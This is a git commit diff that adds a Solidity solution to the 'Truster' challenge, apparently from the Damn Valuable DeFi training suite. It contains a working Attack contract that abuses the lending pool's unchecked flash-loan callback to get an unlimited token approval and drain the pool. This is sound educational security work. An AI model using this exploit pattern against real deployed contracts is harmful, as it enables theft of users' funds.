8bfb313a54a3d05810f552e8aa8776dd7be4c768
Joshua Oladeji <dejijolaoluwa@gmail.com>
2025-05-27 13:26:11 +0100

    add exploit for Truster challenge

--- test/truster/Truster.t.sol
+++ test/truster/Truster.t.sol
@@ -6,11 +6,37 @@ import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";
 
+contract Attack {
+    constructor(
+        TrusterLenderPool _lendingPool,
+        DamnValuableToken _dvt,
+        address _recovery
+    ) {
+        bool success = TrusterLenderPool(_lendingPool).flashLoan(
+            0,
+            address(this),
+            address(_dvt),
+            abi.encodeWithSignature(
+                "approve(address,uint256)",
+                address(this),
+                type(uint256).max
+            )
+        );
+        require(success);
+
+        DamnValuableToken(_dvt).transferFrom(
+            address(_lendingPool),
+            _recovery,
+            DamnValuableToken(_dvt).balanceOf(address(_lendingPool))
+        );
+    }
+}
+
 contract TrusterChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
     address recovery = makeAddr("recovery");
-    
+
     uint256 constant TOKENS_IN_POOL = 1_000_000e18;
 
     DamnValuableToken public token;
@@ -51,7 +77,7 @@ contract TrusterChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_truster() public checkSolvedByPlayer {
-        
+        new Attack(pool, token, recovery);
     }
 
     /**
@@ -63,6 +89,10 @@ contract TrusterChallenge is Test {
 
         // All rescued funds sent to recovery account
         assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
-        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
+        assertEq(
+            token.balanceOf(recovery),
+            TOKENS_IN_POOL,
+            "Not enough tokens in recovery account"
+        );
     }
 }
